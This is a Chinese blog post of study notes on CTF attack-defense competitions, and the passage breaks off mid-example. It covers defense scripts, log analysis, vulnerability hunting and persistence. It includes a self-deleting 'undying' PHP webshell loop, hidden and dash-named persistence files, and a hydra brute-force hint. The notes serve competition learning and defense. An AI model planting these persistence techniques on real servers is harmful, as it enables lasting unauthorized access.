    <content type="html"><![CDATA[<h1 id="ctf线下AWD攻防赛学习笔记"><a href="#ctf线下AWD攻防赛学习笔记" class="headerlink" title="ctf线下AWD攻防赛学习笔记"></a>ctf线下AWD攻防赛学习笔记</h1><p>CTF线下攻防赛主要以攻防模式（Attack &amp; Defense）来呈现。一般在这种模式下，一支参赛队伍有三名队员，所有的参赛队伍都会有同样的初始环境，包含若干台服务器。参赛队伍挖掘漏洞，通过攻击对手的服务器获取Flag来得分，以修补自身服务器的漏洞防止扣分。</p><p>在这种赛制中，不仅仅是比参赛队员的智力和技术，同时也比团队之间的分工配合与合作。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvd3AtY29udGVudC91cGxvYWRzLzIwMTkvMDUvMDUxZGY3YWVmNTE3Zjc0OTZhMDNhODQxYjIwOTUxMzQucG5n?x-oss-process=image/format,png" alt="image"><br><strong>具体步骤可以看我的<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">这篇文章</a></strong></p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><ol><li>语言常见漏洞题目</li></ol><p>PHP语言居多</p><p>Python 模板注入(SSTI)：直接利用漏洞执行命令获得Flag、绕过关键字限制。</p><p>Nodejs 任意文件读取：直接读取Flag。</p><p>PHP 各类漏洞：文件包含、反序列化、文件上传、注入、代码执行、命令执行</p><ol start="2"><li><p>后门漏洞</p></li><li><p>公开CMS漏洞</p></li></ol><p>DZ SSRF漏洞、小众CMS 0day、出题人自己改&#x2F;写的CMS。</p><ol start="4"><li>文件上传漏洞</li></ol><p>filelocation</p><ol start="5"><li>文件包含漏洞</li></ol><h2 id="分工"><a href="#分工" class="headerlink" title="分工"></a>分工</h2><p>在线下攻防赛中一般需要两名队员作为攻击者来进行漏洞挖掘、权限维持、探查网络、漏洞利用、自动化攻击、自动化提交等。这两名队员中要有一个代码编写能力比较强的人，其主要作用是在短时间内构造出能批量提交、自动化攻击的脚本程序，避免浪费人力在提交Flag上。另一名队员充当防护者的角色进行漏洞修复、后门排查、文件监控、弱口令排查等。</p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>防护一般情况下分为漏洞修复、文件备份、后门排查、文件监控、弱口令排查等。</p><p>漏洞修复即在攻击者角色找到了可以攻击的点之后，在相应的代码处进行过滤、修复。</p><p>文件备份即在开始进行比赛的时候一定要对原始数据进行备份，这样可以防止服务器相关Web文件被删除导致服务Down掉之后可以自行恢复（一般在线下比赛服务Down掉会持续扣分，而重启一次服务会扣掉大量分数）。</p><p>后门排查分为两种情况：第一种为主办方为了照顾水平比较低的选手而留下的隐藏后门，第二种为其他参赛队伍通过漏洞取得服务器一定权限后留下来的后门。针对第一种情况可以开始比赛时把备份文件在后门排查工具里（如D盾、河马）进行一次WebShell审查，找到主办方留下的后门，删除即可</p><p>但是也有可能主办方留下了一个免杀马，在这种情况下，如果有外网可以把源代码下载下来，把官方源代码和比赛源代码进行一次diff，这种办法基本上可以找出所有主办方留下的WebShell。也可以利用这种方式帮助攻击者进行漏洞挖掘，因为如果不是已知公开的漏洞，主办方都会在源代码里进行更改，达到可以GetShell的目的。针对第二种情况要看攻击者留下了什么类型的后门，如果是普通的WebShell一句话或者变种的一句话木马，那么直接删除即可。如果是不死马+内存马就会比较麻烦，因为在线下攻防赛中一般不是root权限，所以是没有权限杀死进程的。一般的不死马都是通过循环创建WebShell文件，如果不杀死进程的话会一直创建下去，但是也会有延时性，可以通过这种延时性写一个暴力循环删除的脚本来达到删除的目的</p><p>常见不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>文件监控即是要针对攻击者在服务器上创建的任何文件有一个告警或者阻断的操作，要保持服务器的文件不被删除，不允许上传或者创建文件。网上有相应的文件监控的脚本，可以参考学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span></span><br><span class="line">bakstring = <span class="string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span></span><br><span class="line">logstring = <span class="string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">webshellstring = <span class="string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">difffile = <span class="string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&#x27;drops_log&#x27;</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isListLike</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUnicode</span>(<span class="params">value, encoding=<span class="literal">None</span>, noneToNull=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = <span class="built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="built_in">ord</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(<span class="built_in">str</span>(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir_p</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilelist</span>(<span class="params">cwd</span>):</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMD5</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            <span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">        <span class="built_in">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilemd5dict</span>(<span class="params">filelist = []</span>):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">filelist=[]</span>):</span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">&#x27;bak&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;---------start------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;[*] pre work end!&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = <span class="built_in">list</span>(<span class="built_in">set</span>(file_list) ^ <span class="built_in">set</span>(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filekey, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span></span><br></pre></td></tr></table></figure><p>弱口令排查即是主办方给的服务器为弱口令，或者自己服务器内部Web服务内存在弱口令，针对这种情况一定要及时更改弱口令，做好弱口令检查。</p><p>nmap 扫描 22<br><code>hydra -user -p</code><br>字典生成工具: <a href="https://blog.csdn.net/qq_33936481/article/details/51277679">参考网站</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析:"></a>日志分析:</h2><p>在线下攻防模式中日志分析是非常重要的一环，日志分析一般是在比赛正式开始之后进行的对其他攻击者的流量进行分析提取有用的信息，通过查看其他队伍打过来的流量可以分析到他们留下的WebShell文件名、漏洞利用方式、漏洞产生的点，方便自己进行攻击。因为主办方可能会不允许选手查看日志文件，再加上日志文件不会对POST的数据进行分析打印，所以我们在进行日志监控、流量分析时，一定要提前准备好自己的监控脚本，对Web服务进行监控、分析，这样才可以抓取到完整的其他队伍打过来的流量，方便自己审查。</p><h3 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h3><p>感知可能正在发生的攻击，从而规避存在的安全风险<br>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失<br>记录log脚本<br>这种脚本网上有很多。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$ip</span>       = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];<span class="comment">//访问者要访问的文件名</span></span><br><span class="line"><span class="variable">$parameter</span>   = <span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line"><span class="variable">$time</span>     =   <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">time</span>()); <span class="comment">//访问时间</span></span><br><span class="line"><span class="variable">$logadd</span> = <span class="string">&#x27;来访时间：&#x27;</span>.<span class="variable">$time</span>.<span class="string">&#x27;--&gt;&#x27;</span>.<span class="string">&#x27;访问链接：&#x27;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$ip</span>.<span class="variable">$filename</span>.<span class="string">&#x27;?&#x27;</span>.<span class="variable">$parameter</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line"><span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fh</span>, <span class="variable">$logadd</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具:"></a>日志分析工具:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LogForensics 腾讯实验室</span><br><span class="line">https://security.tencent.com/index.php/opensource/detail/15</span><br><span class="line">北风飘然@金乌网络安全实验室</span><br><span class="line">http://www.freebuf.com/sectool/126698.html</span><br><span class="line">网络ID为piaox的安全从业人员：</span><br><span class="line">http://www.freebuf.com/sectool/110644.html</span><br><span class="line">网络ID：SecSky</span><br><span class="line">http://www.freebuf.com/sectool/8982.html</span><br><span class="line">网络ID：鬼魅羊羔</span><br><span class="line">http://www.freebuf.com/articles/web/96675.html </span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在CTF攻防赛中，比赛的语言以PHP居多，漏洞的类型主要为后门漏洞、注入类型、文件上传、文件包含、代码执行、命令执行或互联网已公开的已知CMS漏洞。因此在比赛中，漏洞挖掘主要是以这几种漏洞为主。</p><p>漏洞挖掘阶段，首先将备份的源代码使用D盾进行查杀，筛选出D盾扫描出的木马文件然后在服务器上将其删除。对于其他类型的漏洞，主要还是通过白盒与黑盒方式进行漏洞挖掘。黑盒的方式与渗透测试有点相似，而白盒测试中，笔者使用的工具为“Seay源代码审计系统”，根据工具列出的漏洞描述去尽可能找上述的漏洞类型</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ol><li>生成“.”开头的隐藏文件。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);    </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol start="2"><li>生成“-”开头的文件。</li></ol><p>-开头的文件，如果使用rm直接删除，将无法删除，因为rm命令将会把-后面的字符串当作参数去执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JD:~/test<span class="comment"># echo &quot;123&quot; &gt; -test.php</span></span><br><span class="line">root@JD:~/test<span class="comment"># rm -test.php </span></span><br><span class="line"><span class="built_in">rm</span>: invalid option -- <span class="string">&#x27;t&#x27;</span></span><br><span class="line">Try <span 